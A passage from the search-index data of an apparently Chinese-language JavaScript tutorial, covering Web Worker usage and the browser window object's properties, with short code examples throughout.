18 19 20 21 22 23 // worker.js // settings var num_workers = 10 ; var items_per_worker = 1000000 ; // start the workers var result = 0 ; var pending_workers = num_workers ; for ( var i = 0 ; i < num_workers ; i += 1 ) { var worker = new Worker ( 'core.js' ); worker . postMessage ( i * items_per_worker ); worker . postMessage (( i + 1 ) * items_per_worker ); worker . onmessage = storeResult ; } // handle the results function storeResult ( event ) { result += event . data ; pending_workers -= 1 ; if ( pending_workers <= 0 ) postMessage ( result ); // finished! } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cWorker \u7ebf\u7a0b\u5185\u90e8\u65b0\u5efa\u4e8610\u4e2a Worker \u7ebf\u7a0b\uff0c\u5e76\u4e14\u4f9d\u6b21\u5411\u8fd910\u4e2a Worker \u53d1\u9001\u6d88\u606f\uff0c\u544a\u77e5\u4e86\u8ba1\u7b97\u7684\u8d77\u70b9\u548c\u7ec8\u70b9\u3002\u8ba1\u7b97\u4efb\u52a1\u811a\u672c\u7684\u4ee3\u7801\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // core.js var start ; onmessage = getStart ; function getStart ( event ) { start = event . data ; onmessage = getEnd ; } var end ; function getEnd ( event ) { end = event . data ; onmessage = null ; work (); } function work () { var result = 0 ; for ( var i = start ; i < end ; i += 1 ) { // perform some complex calculation here result += 1 ; } postMessage ( result ); close (); }","title":"\u5b9e\u4f8b\uff1a Worker \u65b0\u5efa Worker"},{"location":"bom/webworker/#api","text":"","title":"API"},{"location":"bom/webworker/#_6","text":"\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b Worker() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u4f9b\u4e3b\u7ebf\u7a0b\u751f\u6210 Worker \u7ebf\u7a0b\u3002 1 var myWorker = new Worker ( jsUrl , options ); Worker() \u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u811a\u672c\u7684\u7f51\u5740\uff08\u5fc5\u987b\u9075\u5b88\u540c\u6e90\u653f\u7b56\uff09\uff0c\u8be5\u53c2\u6570\u662f\u5fc5\u9700\u7684\uff0c\u4e14\u53ea\u80fd\u52a0\u8f7d JS \u811a\u672c\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u914d\u7f6e\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u53ef\u9009\u3002\u5b83\u7684\u4e00\u4e2a\u4f5c\u7528\u5c31\u662f\u6307\u5b9a Worker \u7684\u540d\u79f0\uff0c\u7528\u6765\u533a\u5206\u591a\u4e2a Worker \u7ebf\u7a0b\u3002 1 2 3 4 5 // \u4e3b\u7ebf\u7a0b var myWorker = new Worker ( 'worker.js' , { name : 'myWorker' }); // Worker \u7ebf\u7a0b self . name // myWorker Worker() \u6784\u9020\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a Worker \u7ebf\u7a0b\u5bf9\u8c61\uff0c\u7528\u6765\u4f9b\u4e3b\u7ebf\u7a0b\u64cd\u4f5c Worker\u3002Worker \u7ebf\u7a0b\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5982\u4e0b\u3002 Worker.onerror\uff1a\u6307\u5b9a error \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 Worker.onmessage\uff1a\u6307\u5b9a message \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u53d1\u9001\u8fc7\u6765\u7684\u6570\u636e\u5728 Event.data \u5c5e\u6027\u4e2d\u3002 Worker.onmessageerror\uff1a\u6307\u5b9a messageerror \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u53d1\u9001\u7684\u6570\u636e\u65e0\u6cd5\u5e8f\u5217\u5316\u6210\u5b57\u7b26\u4e32\u65f6\uff0c\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002 Worker.postMessage()\uff1a\u5411 Worker \u7ebf\u7a0b\u53d1\u9001\u6d88\u606f\u3002 Worker.terminate()\uff1a\u7acb\u5373\u7ec8\u6b62 Worker \u7ebf\u7a0b\u3002","title":"\u4e3b\u7ebf\u7a0b"},{"location":"bom/webworker/#worker_4","text":"Web Worker \u6709\u81ea\u5df1\u7684\u5168\u5c40\u5bf9\u8c61\uff0c\u4e0d\u662f\u4e3b\u7ebf\u7a0b\u7684 window \uff0c\u800c\u662f\u4e00\u4e2a\u4e13\u95e8\u4e3a Worker \u5b9a\u5236\u7684\u5168\u5c40\u5bf9\u8c61\u3002\u56e0\u6b64\u5b9a\u4e49\u5728 window \u4e0a\u9762\u7684\u5bf9\u8c61\u548c\u65b9\u6cd5\u4e0d\u662f\u5168\u90e8\u90fd\u53ef\u4ee5\u4f7f\u7528\u3002 Worker \u7ebf\u7a0b\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5168\u5c40\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 self.name\uff1a Worker \u7684\u540d\u5b57\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u7531\u6784\u9020\u51fd\u6570\u6307\u5b9a\u3002 self.onmessage\uff1a\u6307\u5b9a message \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 self.onmessageerror\uff1a\u6307\u5b9a messageerror \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u53d1\u9001\u7684\u6570\u636e\u65e0\u6cd5\u5e8f\u5217\u5316\u6210\u5b57\u7b26\u4e32\u65f6\uff0c\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002 self.close()\uff1a\u5173\u95ed Worker \u7ebf\u7a0b\u3002 self.postMessage()\uff1a\u5411\u4ea7\u751f\u8fd9\u4e2a Worker \u7684\u7ebf\u7a0b\u53d1\u9001\u6d88\u606f\u3002 self.importScripts()\uff1a\u52a0\u8f7d JS \u811a\u672c\u3002 \uff08\u5b8c\uff09","title":"Worker \u7ebf\u7a0b"},{"location":"bom/window/","text":"window \u5bf9\u8c61 \u00b6 \u6982\u8ff0 \u00b6 \u6d4f\u89c8\u5668\u91cc\u9762\uff0c window \u5bf9\u8c61\uff08\u6ce8\u610f\uff0c w \u4e3a\u5c0f\u5199\uff09\u6307\u5f53\u524d\u7684\u6d4f\u89c8\u5668\u7a97\u53e3\u3002\u5b83\u4e5f\u662f\u5f53\u524d\u9875\u9762\u7684\u9876\u5c42\u5bf9\u8c61\uff0c\u5373\u6700\u9ad8\u4e00\u5c42\u7684\u5bf9\u8c61\uff0c\u6240\u6709\u5176\u4ed6\u5bf9\u8c61\u90fd\u662f\u5b83\u7684\u4e0b\u5c5e\u3002\u4e00\u4e2a\u53d8\u91cf\u5982\u679c\u672a\u58f0\u660e\uff0c\u90a3\u4e48\u9ed8\u8ba4\u5c31\u662f\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 1 2 a = 1 ; window . a // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u662f\u4e00\u4e2a\u6ca1\u6709\u58f0\u660e\u5c31\u76f4\u63a5\u8d4b\u503c\u7684\u53d8\u91cf\uff0c\u5b83\u81ea\u52a8\u6210\u4e3a\u9876\u5c42\u5bf9\u8c61\u7684\u5c5e\u6027\u3002 window \u6709\u81ea\u5df1\u7684\u5b9e\u4f53\u542b\u4e49\uff0c\u5176\u5b9e\u4e0d\u9002\u5408\u5f53\u4f5c\u6700\u9ad8\u4e00\u5c42\u7684\u9876\u5c42\u5bf9\u8c61\uff0c\u8fd9\u662f\u4e00\u4e2a\u8bed\u8a00\u7684\u8bbe\u8ba1\u5931\u8bef\u3002\u6700\u65e9\uff0c\u8bbe\u8ba1\u8fd9\u95e8\u8bed\u8a00\u7684\u65f6\u5019\uff0c\u539f\u59cb\u8bbe\u60f3\u662f\u8bed\u8a00\u5185\u7f6e\u7684\u5bf9\u8c61\u8d8a\u5c11\u8d8a\u597d\uff0c\u8fd9\u6837\u53ef\u4ee5\u63d0\u9ad8\u6d4f\u89c8\u5668\u7684\u6027\u80fd\u3002\u56e0\u6b64\uff0c\u8bed\u8a00\u8bbe\u8ba1\u8005 Brendan Eich \u5c31\u628a window \u5bf9\u8c61\u5f53\u4f5c\u9876\u5c42\u5bf9\u8c61\uff0c\u6240\u6709\u672a\u58f0\u660e\u5c31\u8d4b\u503c\u7684\u53d8\u91cf\u90fd\u81ea\u52a8\u53d8\u6210 window \u5bf9\u8c61\u7684\u5c5e\u6027\u3002\u8fd9\u79cd\u8bbe\u8ba1\u4f7f\u5f97\u7f16\u8bd1\u9636\u6bb5\u65e0\u6cd5\u68c0\u6d4b\u51fa\u672a\u58f0\u660e\u53d8\u91cf\uff0c\u4f46\u5230\u4e86\u4eca\u5929\u5df2\u7ecf\u6ca1\u6709\u529e\u6cd5\u7ea0\u6b63\u4e86\u3002 window \u5bf9\u8c61\u7684\u5c5e\u6027 \u00b6 window.name \u00b6 window.name \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u540d\u5b57\u3002\u7a97\u53e3\u4e0d\u4e00\u5b9a\u9700\u8981\u540d\u5b57\uff0c\u8fd9\u4e2a\u5c5e\u6027\u4e3b\u8981\u914d\u5408\u8d85\u94fe\u63a5\u548c\u8868\u5355\u7684 target \u5c5e\u6027\u4f7f\u7528\u3002 1 2 3 window . name = 'Hello World!' ; console . log ( window . name ) // \"Hello World!\" \u8be5\u5c5e\u6027\u53ea\u80fd\u4fdd\u5b58\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u5199\u5165\u7684\u503c\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u4f1a\u81ea\u52a8\u8f6c\u6210\u5b57\u7b26\u4e32\u3002\u5404\u4e2a\u6d4f\u89c8\u5668\u5bf9\u8fd9\u4e2a\u503c\u7684\u50a8\u5b58\u5bb9\u91cf\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u662f\u4e00\u822c\u6765\u8bf4\uff0c\u53ef\u4ee5\u9ad8\u8fbe\u51e0MB\u3002 \u53ea\u8981\u6d4f\u89c8\u5668\u7a97\u53e3\u4e0d\u5173\u95ed\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662f\u4e0d\u4f1a\u6d88\u5931\u7684\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u8bbf\u95ee a.com \u65f6\uff0c\u8be5\u9875\u9762\u7684\u811a\u672c\u8bbe\u7f6e\u4e86 window.name \uff0c\u63a5\u4e0b\u6765\u5728\u540c\u4e00\u4e2a\u7a97\u53e3\u91cc\u9762\u8f7d\u5165\u4e86 b.com \uff0c\u65b0\u9875\u9762\u7684\u811a\u672c\u53ef\u4ee5\u8bfb\u5230\u4e0a\u4e00\u4e2a\u7f51\u9875\u8bbe\u7f6e\u7684 window.name \u3002\u9875\u9762\u5237\u65b0\u4e5f\u662f\u8fd9\u79cd\u60c5\u51b5\u3002\u4e00\u65e6\u6d4f\u89c8\u5668\u7a97\u53e3\u5173\u95ed\u540e\uff0c\u8be5\u5c5e\u6027\u4fdd\u5b58\u7684\u503c\u5c31\u4f1a\u6d88\u5931\uff0c\u56e0\u4e3a\u8fd9\u65f6\u7a97\u53e3\u5df2\u7ecf\u4e0d\u5b58\u5728\u4e86\u3002 window.closed\uff0cwindow.opener \u00b6 window.closed \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7a97\u53e3\u662f\u5426\u5173\u95ed\u3002 1 window . closed // false \u4e0a\u9762\u4ee3\u7801\u68c0\u67e5\u5f53\u524d\u7a97\u53e3\u662f\u5426\u5173\u95ed\u3002\u8fd9\u79cd\u68c0\u67e5\u610f\u4e49\u4e0d\u5927\uff0c\u56e0\u4e3a\u53ea\u8981\u80fd\u8fd0\u884c\u4ee3\u7801\uff0c\u5f53\u524d\u7a97\u53e3\u80af\u5b9a\u6ca1\u6709\u5173\u95ed\u3002\u8fd9\u4e2a\u5c5e\u6027\u4e00\u822c\u7528\u6765\u68c0\u67e5\uff0c\u4f7f\u7528\u811a\u672c\u6253\u5f00\u7684\u65b0\u7a97\u53e3\u662f\u5426\u5173\u95ed\u3002 1 2 3 4 5 var popup = window . open (); if (( popup !== null ) && ! popup . closed ) { // \u7a97\u53e3\u4ecd\u7136\u6253\u5f00\u7740 } window.opener \u5c5e\u6027\u8868\u793a\u6253\u5f00\u5f53\u524d\u7a97\u53e3\u7684\u7236\u7a97\u53e3\u3002\u5982\u679c\u5f53\u524d\u7a97\u53e3\u6ca1\u6709\u7236\u7a97\u53e3\uff08\u5373\u76f4\u63a5\u5728\u5730\u5740\u680f\u8f93\u5165\u6253\u5f00\uff09\uff0c\u5219\u8fd4\u56de null \u3002 1 window . open (). opener === window // true \u4e0a\u9762\u8868\u8fbe\u5f0f\u4f1a\u6253\u5f00\u4e00\u4e2a\u65b0\u7a97\u53e3\uff0c\u7136\u540e\u8fd4\u56de true \u3002 \u5982\u679c\u4e24\u4e2a\u7a97\u53e3\u4e4b\u95f4\u4e0d\u9700\u8981\u901a\u4fe1\uff0c\u5efa\u8bae\u5c06\u5b50\u7a97\u53e3\u7684 opener \u5c5e\u6027\u663e\u5f0f\u8bbe\u4e3a null \uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u4e00\u4e9b\u5b89\u5168\u9690\u60a3\u3002 1 2 var newWin = window . open ( 'example.html' , 'newWindow' , 'height=400,width=400' ); newWin . opener = null ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b50\u7a97\u53e3\u7684 opener \u5c5e\u6027\u8bbe\u4e3a null \uff0c\u4e24\u4e2a\u7a97\u53e3\u4e4b\u95f4\u5c31\u6ca1\u529e\u6cd5\u518d\u8054\u7cfb\u4e86\u3002 \u901a\u8fc7 opener \u5c5e\u6027\uff0c\u53ef\u4ee5\u83b7\u5f97\u7236\u7a97\u53e3\u7684\u5168\u5c40\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u4f46\u53ea\u9650\u4e8e\u4e24\u4e2a\u7a97\u53e3\u540c\u6e90\u7684\u60c5\u51b5\uff08\u53c2\u89c1\u300a\u540c\u6e90\u9650\u5236\u300b\u4e00\u7ae0\uff09\uff0c\u4e14\u5176\u4e2d\u4e00\u4e2a\u7a97\u53e3\u7531\u53e6\u4e00\u4e2a\u6253\u5f00\u3002 <a> \u5143\u7d20\u6dfb\u52a0 rel=\"noopener\" \u5c5e\u6027\uff0c\u53ef\u4ee5\u9632\u6b62\u65b0\u6253\u5f00\u7684\u7a97\u53e3\u83b7\u53d6\u7236\u7a97\u53e3\uff0c\u51cf\u8f7b\u88ab\u6076\u610f\u7f51\u7ad9\u4fee\u6539\u7236\u7a97\u53e3 URL \u7684\u98ce\u9669\u3002 1 2 3 < a href = \"https://an.evil.site\" target = \"_blank\" rel = \"noopener\" > \u6076\u610f\u7f51\u7ad9 </ a > window.self\uff0cwindow.window \u00b6 window.self \u548c window.window \u5c5e\u6027\u90fd\u6307\u5411\u7a97\u53e3\u672c\u8eab\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 window . self === window // true window . window === window // true window.frames\uff0cwindow.length \u00b6 window.frames \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u4e3a\u9875\u9762\u5185\u6240\u6709\u6846\u67b6\u7a97\u53e3\uff0c\u5305\u62ec frame \u5143\u7d20\u548c iframe \u5143\u7d20\u3002 window.frames[0] \u8868\u793a\u9875\u9762\u4e2d\u7b2c\u4e00\u4e2a\u6846\u67b6\u7a97\u53e3\u3002 \u5982\u679c iframe \u5143\u7d20\u8bbe\u7f6e\u4e86 id \u6216 name \u5c5e\u6027\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u7528\u5c5e\u6027\u503c\uff0c\u5f15\u7528\u8fd9\u4e2a iframe \u7a97\u53e3\u3002\u6bd4\u5982 <iframe name=\"myIFrame\"> \u53ef\u4ee5\u7528 frames['myIFrame'] \u6216\u8005 frames.myIFrame \u6765\u5f15\u7528\u3002 frames \u5c5e\u6027\u5b9e\u9645\u4e0a\u662f window \u5bf9\u8c61\u7684\u522b\u540d\u3002 1 frames === window // true \u56e0\u6b64\uff0c frames[0] \u4e5f\u53ef\u4ee5\u7528 window[0] \u8868\u793a\u3002\u4f46\u662f\uff0c\u4ece\u8bed\u4e49\u4e0a\u770b\uff0c frames \u66f4\u6e05\u6670\uff0c\u800c\u4e14\u8003\u8651\u5230 window \u8fd8\u662f\u5168\u5c40\u5bf9\u8c61\uff0c\u56e0\u6b64\u63a8\u8350\u8868\u793a\u591a\u7a97\u53e3\u65f6\uff0c\u603b\u662f\u4f7f\u7528 frames[0] \u7684\u5199\u6cd5\u3002\u66f4\u591a\u4ecb\u7ecd\u8bf7\u770b\u4e0b\u6587\u7684\u300a\u591a\u7a97\u53e3\u64cd\u4f5c\u300b\u90e8\u5206\u3002 window.length \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u7f51\u9875\u5305\u542b\u7684\u6846\u67b6\u603b\u6570\u3002\u5982\u679c\u5f53\u524d\u7f51\u9875\u4e0d\u5305\u542b frame \u548c iframe \u5143\u7d20\uff0c\u90a3\u4e48 window.length \u5c31\u8fd4\u56de 0 \u3002 1 window . frames . length === window . length // true \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c window.frames.length \u4e0e window.length \u5e94\u8be5\u662f\u76f8\u7b49\u7684\u3002 window.frameElement \u00b6 window.frameElement \u5c5e\u6027\u4e3b\u8981\u7528\u4e8e\u5f53\u524d\u7a97\u53e3\u5d4c\u5728\u53e6\u4e00\u4e2a\u7f51\u9875\u7684\u60c5\u51b5\uff08\u5d4c\u5165 <object> \u3001 <iframe> \u6216 <embed> \u5143\u7d20\uff09\uff0c\u8fd4\u56de\u5f53\u524d\u7a97\u53e3\u6240\u5728\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u7a97\u53e3\u662f\u9876\u5c42\u7a97\u53e3\uff0c\u6216\u8005\u6240\u5d4c\u5165\u7684\u90a3\u4e2a\u7f51\u9875\u4e0d\u662f\u540c\u6e90\u7684\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <iframe src=\"about.html\"></iframe> // \u4e0b\u9762\u7684\u811a\u672c\u5728 about.html \u91cc\u9762 var frameEl = window . frameElement ; if ( frameEl ) { frameEl . src = 'other.html' ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c frameEl \u53d8\u91cf\u5c31\u662f <iframe> \u5143\u7d20\u3002 window.top\uff0cwindow.parent \u00b6 window.top \u5c5e\u6027\u6307\u5411\u6700\u9876\u5c42\u7a97\u53e3\uff0c\u4e3b\u8981\u7528\u4e8e\u5728\u6846\u67b6\u7a97\u53e3\uff08frame\uff09\u91cc\u9762\u83b7\u53d6\u9876\u5c42\u7a97\u53e3\u3002 window.parent \u5c5e\u6027\u6307\u5411\u7236\u7a97\u53e3\u3002\u5982\u679c\u5f53\u524d\u7a97\u53e3\u6ca1\u6709\u7236\u7a97\u53e3\uff0c window.parent \u6307\u5411\u81ea\u8eab\u3002 1 2 3 if ( window . parent !== window . top ) { // \u8868\u660e\u5f53\u524d\u7a97\u53e3\u5d4c\u5165\u4e0d\u6b62\u4e00\u5c42 } \u5bf9\u4e8e\u4e0d\u5305\u542b\u6846\u67b6\u7684\u7f51\u9875\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u7b49\u540c\u4e8e window \u5bf9\u8c61\u3002 window.status \u00b6 window.status \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199\u6d4f\u89c8\u5668\u72b6\u6001\u680f\u7684\u6587\u672c\u3002\u4f46\u662f\uff0c\u73b0\u5728\u5f88\u591a\u6d4f\u89c8\u5668\u90fd\u4e0d\u5141\u8bb8\u6539\u5199\u72b6\u6001\u680f\u6587\u672c\uff0c\u6240\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u4e00\u5b9a\u6709\u6548\u3002 window.devicePixelRatio \u00b6 window.devicePixelRatio \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\uff0c\u8868\u793a\u4e00\u4e2a CSS \u50cf\u7d20\u7684\u5927\u5c0f\u4e0e\u4e00\u4e2a\u7269\u7406\u50cf\u7d20\u7684\u5927\u5c0f\u4e4b\u95f4\u7684\u6bd4\u7387\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u8868\u793a\u4e00\u4e2a CSS \u50cf\u7d20\u7531\u591a\u5c11\u4e2a\u7269\u7406\u50cf\u7d20\u7ec4\u6210\u3002\u5b83\u53ef\u4ee5\u7528\u4e8e\u5224\u65ad\u7528\u6237\u7684\u663e\u793a\u73af\u5883\uff0c\u5982\u679c\u8fd9\u4e2a\u6bd4\u7387\u8f83\u5927\uff0c\u5c31\u8868\u793a\u7528\u6237\u6b63\u5728\u4f7f\u7528\u9ad8\u6e05\u5c4f\u5e55\uff0c\u56e0\u6b64\u53ef\u4ee5\u663e\u793a\u8f83\u5927\u50cf\u7d20\u7684\u56fe\u7247\u3002 \u4f4d\u7f6e\u5927\u5c0f\u5c5e\u6027 \u00b6 \u4ee5\u4e0b\u5c5e\u6027\u8fd4\u56de window \u5bf9\u8c61\u7684\u4f4d\u7f6e\u4fe1\u606f\u548c\u5927\u5c0f\u4fe1\u606f\u3002 \uff081\uff09window.screenX\uff0cwindow.screenY window.screenX \u548c window.screenY \u5c5e\u6027\uff0c\u8fd4\u56de\u6d4f\u89c8\u5668\u7a97\u53e3\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u5f53\u524d\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u8ddd\u79bb\u548c\u5782\u76f4\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \uff082\uff09 window.innerHeight\uff0cwindow.innerWidth window.innerHeight \u548c window.innerWidth \u5c5e\u6027\uff0c\u8fd4\u56de\u7f51\u9875\u5728\u5f53\u524d\u7a97\u53e3\u4e2d\u53ef\u89c1\u90e8\u5206\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6\uff0c\u5373\u201c\u89c6\u53e3\u201d\uff08viewport\uff09\u7684\u5927\u5c0f\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \u7528\u6237\u653e\u5927\u7f51\u9875\u7684\u65f6\u5019\uff08\u6bd4\u5982\u5c06\u7f51\u9875\u4ece100%\u7684\u5927\u5c0f\u653e\u5927\u4e3a200%\uff09\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u4f1a\u53d8\u5c0f\u3002\u56e0\u4e3a\u8fd9\u65f6\u7f51\u9875\u7684\u50cf\u7d20\u5927\u5c0f\u4e0d\u53d8\uff08\u6bd4\u5982\u5bbd\u5ea6\u8fd8\u662f960\u50cf\u7d20\uff09\uff0c\u53ea\u662f\u6bcf\u4e2a\u50cf\u7d20\u5360\u636e\u7684\u5c4f\u5e55\u7a7a\u95f4\u53d8\u5927\u4e86\uff0c\u56e0\u6b64\u53ef\u89c1\u90e8\u5206\uff08\u89c6\u53e3\uff09\u5c31\u53d8\u5c0f\u4e86\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u503c\u5305\u62ec\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6\u3002 \uff083\uff09window.outerHeight\uff0cwindow.outerWidth window.outerHeight \u548c window.outerWidth \u5c5e\u6027\u8fd4\u56de\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u9ad8\u5ea6\u548c\u5bbd\u5ea6\uff0c\u5305\u62ec\u6d4f\u89c8\u5668\u83dc\u5355\u548c\u8fb9\u6846\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \uff084\uff09window.scrollX\uff0cwindow.scrollY window.scrollX \u5c5e\u6027\u8fd4\u56de\u9875\u9762\u7684\u6c34\u5e73\u6eda\u52a8\u8ddd\u79bb\uff0c window.scrollY \u5c5e\u6027\u8fd4\u56de\u9875\u9762\u7684\u5782\u76f4\u6eda\u52a8\u8ddd\u79bb\uff0c\u5355\u4f4d\u90fd\u4e3a\u50cf\u7d20\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u7684\u8fd4\u56de\u503c\u4e0d\u662f\u6574\u6570\uff0c\u800c\u662f\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679c\u9875\u9762\u6ca1\u6709\u6eda\u52a8\uff0c\u5b83\u4eec\u7684\u503c\u5c31\u662f 0 \u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5982\u679c\u7528\u6237\u5411\u4e0b\u62c9\u52a8\u4e86\u5782\u76f4\u6eda\u52a8\u676175\u50cf\u7d20\uff0c\u90a3\u4e48 window.scrollY \u5c31\u662f75\u5de6\u53f3\u3002\u7528\u6237\u6c34\u5e73\u5411\u53f3\u62c9\u52a8\u6c34\u5e73\u6eda\u52a8\u6761200\u50cf\u7d20\uff0c window.scrollX \u5c31\u662f200\u5de6\u53f3\u3002 1 2 3 if ( window . scrollY < 75 ) { window . scroll ( 0 , 75 ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u9875\u9762\u5411\u4e0b\u6eda\u52a8\u7684\u8ddd\u79bb\u5c0f\u4e8e75\u50cf\u7d20\uff0c\u90a3\u4e48\u9875\u9762\u5411\u4e0b\u6eda\u52a875\u50cf\u7d20\u3002 \uff085\uff09window.pageXOffset\uff0cwindow.pageYOffset window.pageXOffset \u5c5e\u6027\u548c window.pageYOffset \u5c5e\u6027\uff0c\u662f window.scrollX \u548c window.scrollY \u522b\u540d\u3002 \u7ec4\u4ef6\u5c5e\u6027 \u00b6 \u7ec4\u4ef6\u5c5e\u6027\u8fd4\u56de\u6d4f\u89c8\u5668\u7684\u7ec4\u4ef6\u5bf9\u8c61\u3002\u8fd9\u6837\u7684\u5c5e\u6027\u6709\u4e0b\u9762\u51e0\u4e2a\u3002 window.locationbar \uff1a\u5730\u5740\u680f\u5bf9\u8c61 window.menubar \uff1a\u83dc\u5355\u680f\u5bf9\u8c61 window.scrollbars \uff1a\u7a97\u53e3\u7684\u6eda\u52a8\u6761\u5bf9\u8c61 window.toolbar \uff1a\u5de5\u5177\u680f\u5bf9\u8c61 window.statusbar \uff1a\u72b6\u6001\u680f\u5bf9\u8c61 window.personalbar \uff1a\u7528\u6237\u5b89\u88c5\u7684\u4e2a\u4eba\u5de5\u5177\u680f\u5bf9\u8c61 \u8fd9\u4e9b\u5bf9\u8c61\u7684 visible \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8fd9\u4e9b\u7ec4\u4ef6\u662f\u5426\u53ef\u89c1\u3002\u8fd9\u4e9b\u5c5e\u6027\u53ea\u8bfb\u3002 1 2 3 4 5 6 window . locationbar . visible window . menubar . visible window . scrollbars . visible window . toolbar . visible window . statusbar . visible window . personalbar . visible \u5168\u5c40\u5bf9\u8c61\u5c5e\u6027 \u00b6 \u5168\u5c40\u5bf9\u8c61\u5c5e\u6027\u6307\u5411\u4e00\u4e9b\u6d4f\u89c8\u5668\u539f\u751f\u7684\u5168\u5c40\u5bf9\u8c61\u3002 window.document \uff1a\u6307\u5411 document \u5bf9\u8c61\uff0c\u8be6\u89c1\u300adocument \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u5c5e\u6027\u6709\u540c\u6e90\u9650\u5236\u3002\u53ea\u6709\u6765\u81ea\u540c\u6e90\u7684\u811a\u672c\u624d\u80fd\u8bfb\u53d6\u8fd9\u4e2a\u5c5e\u6027\u3002 window.location \uff1a\u6307\u5411 Location \u5bf9\u8c61\uff0c\u7528\u4e8e\u83b7\u53d6\u5f53\u524d\u7a97\u53e3\u7684 URL \u4fe1\u606f\u3002\u5b83\u7b49\u540c\u4e8e document.location \u5c5e\u6027\uff0c\u8be6\u89c1\u300aLocation \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 window.navigator \uff1a\u6307\u5411 Navigator \u5bf9\u8c61\uff0c\u7528\u4e8e\u83b7\u53d6\u73af\u5883\u4fe1\u606f\uff0c\u8be6\u89c1\u300aNavigator \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 window.history \uff1a\u6307\u5411 History \u5bf9\u8c61\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u7684\u6d4f\u89c8\u5386\u53f2\uff0c\u8be6\u89c1\u300aHistory \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002 window.localStorage \uff1a\u6307\u5411\u672c\u5730\u50a8\u5b58\u7684 localStorage 